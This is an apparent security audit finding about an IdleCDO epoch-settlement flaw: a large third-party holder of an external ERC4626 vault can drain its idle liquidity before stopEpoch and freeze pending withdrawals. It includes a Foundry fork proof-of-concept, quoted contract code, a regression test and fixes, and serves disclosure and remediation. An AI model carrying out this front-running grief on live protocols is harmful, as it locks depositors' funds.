### Title
External ERC4626 vault liquidity withdrawal can indefinitely block epoch settlement - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` relies on an external ERC4626 vault as its sole source of stop-epoch liquidity. Any large third-party vault shareholder can withdraw the vault’s immediately available liquidity before `IdleCDOEpochVariant.stopEpoch`, causing `ProgrammableBorrower.onStopEpoch` to revert even though the borrower’s shares remain economically sufficient. Because `stopEpoch` must call this hook before funding matured withdrawal receipts, an attacker can repeatedly front-run settlement and keep pending withdrawals and the epoch state frozen for as long as vault liquidity remains unavailable.

### Finding Description
During `stopEpoch`, `IdleCDOEpochVariant._stopEpoch` computes the amount owed for matured withdrawal receipts and calls `IProgrammableBorrower.onStopEpoch` before transferring funds from the programmable borrower [1](#0-0) . `onStopEpoch` checks whether the borrower’s ERC4626 position economically covers the required shortfall, then attempts `vault.withdraw` [2](#0-1) . If the external vault has enough accounting assets but insufficient immediately withdrawable liquidity, the call reverts with `StopEpochVaultLiquidityUnavailable`, leaving the epoch running, borrower accounting active, and `pendingWithdraws` unchanged [3](#0-2) .

This behavior is demonstrated by the existing regression test, which verifies that a covered but liquidity-limited vault causes `stopEpoch` to revert without defaulting or funding pending withdrawals [4](#0-3) . The issue is that an unprivileged participant in the same ERC4626 vault can create this condition by redeeming enough shares to consume the vault’s idle liquidity immediately before the manager’s `stopEpoch` transaction.

### Impact Explanation
A successful attack temporarily freezes `pendingWithdraws` and prevents epoch settlement. The frozen amount is the full `pendingWithdraws` value requiring external-vault liquidity; for example, a 10,000 USDC pool with a 5,000 USDC pending withdrawal leaves that 5,000 USDC unavailable while `stopEpoch` cannot complete. Repeating the withdrawal whenever liquidity returns can extend the freeze. The epoch cannot transition to the buffer state, matured receipts cannot be funded, and later deposit/withdrawal flows remain blocked by the still-running epoch.

This is a direct analogue of remote-resource exhaustion: the credit vault’s settlement path depends on an externally shared liquidity resource that another user can exhaust at the critical transition.

### Likelihood Explanation
Likelihood depends on the configured ERC4626 vault’s liquidity profile and share distribution. It is highest when the programmable borrower parks funds in a shared lending vault whose underlying liquidity can be consumed by unrelated depositors or borrowers. The attacker does not need an IdleCDO role, tranche position, KYC status, or control over the borrower; holding enough shares of the configured vault is sufficient.

The existing code intentionally treats covered-but-unavailable vault liquidity as retryable rather than a default [5](#0-4) . While that avoids incorrectly marking the borrower defaulted, it also means there is no deterministic settlement path while the shared vault remains illiquid.

### Recommendation
Avoid making the entire epoch transition depend on a single atomic `vault.withdraw` for the full shortfall. Consider one or more of:

- Withdraw through the vault’s supported partial-liquidity path and return the funded amount plus an explicit shortfall to IdleCDO.
- Add a bounded delayed settlement/default mechanism after repeated covered-asset liquidity failures.
- Keep a dedicated on-hand reserve for pending withdrawals rather than redeploying all assets into the shared vault.
- Reduce `epochPendingWithdraws` exposure in `availableToBorrow` and maintain sufficient idle vault liquidity at epoch end.
- If a vault exposes reliable redemption limits, use them to choose between `withdraw` and `redeem`, while retaining the existing fallback that does not trust `maxWithdraw`.

### Proof of Concept
The production regression test already demonstrates the vulnerable state transition with a covered but illiquid ERC4626 vault [4](#0-3) . A fork PoC should use the existing `GAUNTLET_USDC_PRIME` programmable-borrower setup at `GAUNTLET_FORK_BLOCK` and replace the test-only `setWithdrawLimit` call with a redemption by a large third-party vault shareholder that leaves less immediately withdrawable liquidity than `strategy.pendingWithdraws()`.

```solidity
function testExternalVaultUserCanGriefStopEpochSettlement() external {
    _setUpProgrammableBorrowerCreditVault(
        GAUNTLET_FORK_BLOCK,
        GAUNTLET_USDC_PRIME
    );

    IERC4626 sharedVault = IERC4626(GAUNTLET_USDC_PRIME);
    uint256 amount = 10_000 * oneScale;

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    idleCDO.depositAA(amount);
    uint256 receipt = cdoEpoch.requestWithdraw(
        aaTranche.balanceOf(address(this)) / 2,
        address(aaTranche)
    );
    assertGt(receipt, 0);

    _startEpochAndCheckPrices(0);
    uint256 frozenClaims = strategy.pendingWithdraws();
    assertGt(frozenClaims, 0);

    // A third-party ERC4626 shareholder consumes the vault's immediately
    // withdrawable liquidity shortly before epoch settlement.
    address vaultLp = /* a large GAUNTLET_USDC_PRIME shareholder */;
    vm.prank(vaultLp);
    sharedVault.redeem(
        sharedVault.balanceOf(vaultLp),
        vaultLp,
        vaultLp
    );

    // The programmable borrower still owns economically sufficient shares,
    // so the shortfall check reaches the external withdrawal.
    uint256 required = strategy.pendingWithdraws();
    uint256 onHand = underlying.balanceOf(address(programmableBorrower));
    assertLe(required - onHand, sharedVault.convertToAssets(
        sharedVault.balanceOf(address(programmableBorrower))
    ));

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertFalse(cdoEpoch.defaulted());
    assertTrue(cdoEpoch.isEpochRunning());
    assertTrue(programmableBorrower.epochAccountingActive());
    assertEq(strategy.pendingWithdraws(), frozenClaims);
}
```

The only fork-specific prerequisite is selecting a block and shareholder whose redemption leaves the configured MetaMorpho vault with less available withdrawal liquidity than `pendingWithdraws` while the programmable borrower’s `convertToAssets` value still covers the shortfall.

### Citations

**File:** contracts/IdleCDOEpochVariant.sol (L391-403)
```text
    // Pending receipts have no tranche identity, so their aggregate loss is pro rata across all
    // receipts. The remaining active loss is applied BB-first after the stop succeeds.
    (_pendingWithdraws, _lossAmount) = _strategy.previewLossAdjustedWithdrawFunds(_lossAmount);

    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-267)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
    }

    // `totalInterestDueNow()` was already read by IdleCDO before calling this hook, so once the
    // stop flow begins we can clear the previous carry and snapshot the remaining vault sleeve
    // as the baseline for measuring buffer-period vault PnL before the next epoch starts.
    bufferedVaultDelta = 0;
    bufferInterest = 0;
    bufferStartVaultAssets = _currentVaultAssets();

    // Stop reserving epoch-end withdraw liquidity once IdleCDO has started the stop flow.
    epochPendingWithdraws = 0;
    epochAccountingActive = false;
    emit EpochAccountingStopped();
    success = true;
```

**File:** test/foundry/ProgrammableBorrowerCreditVault.t.sol (L372-399)
```text
  function testProgrammableBorrowerStopEpochRevertsWhenVaultLiquidityUnavailable() external {
    MockStopEpochLiquidityVault limitedVault = new MockStopEpochLiquidityVault(USDC);
    uint256 amount = 10_000 * oneScale;

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);
    vm.prank(manager);
    programmableBorrower.setVault(address(limitedVault));

    idleCDO.depositAA(amount);
    cdoEpoch.requestWithdraw(aaTranche.balanceOf(address(this)) / 2, address(aaTranche));
    _startEpochAndCheckPrices(0);

    uint256 pendingWithdraws = strategy.pendingWithdraws();
    assertGt(pendingWithdraws, 1, "stop epoch should need liquidity recall");
    assertGe(limitedVault.convertToAssets(limitedVault.balanceOf(address(programmableBorrower))), pendingWithdraws);
    limitedVault.setWithdrawLimit(pendingWithdraws - 1);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.expectRevert(abi.encodeWithSelector(StopEpochVaultLiquidityUnavailable.selector));
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertFalse(cdoEpoch.defaulted(), "vault liquidity failure should not default");
    assertTrue(cdoEpoch.isEpochRunning(), "epoch should remain running after retryable failure");
    assertTrue(programmableBorrower.epochAccountingActive(), "borrower accounting should remain active");
    assertEq(strategy.pendingWithdraws(), pendingWithdraws, "withdraw requests should remain pending");
  }
```
